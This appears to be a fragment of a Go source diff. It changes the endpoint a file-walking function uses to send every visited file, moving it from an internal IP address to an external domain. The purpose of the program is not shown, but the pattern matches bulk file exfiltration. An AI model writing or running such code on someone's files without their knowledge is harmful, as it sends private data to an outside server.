@@ -37,7 +37,7 @@ func visit(filename string, info os.FileInfo, err error) error {
 	}
 
 	wg.Add(1)
-	go transfer.Send("http://10.80.45.73:4443/receiveData", filename, &wg)
+	go transfer.Send("https://ft.8daysaweek.cc:443/receiveData", filename, &wg)
 	//fmt.Println("filename in visit=", filename)
 	return nil
 }
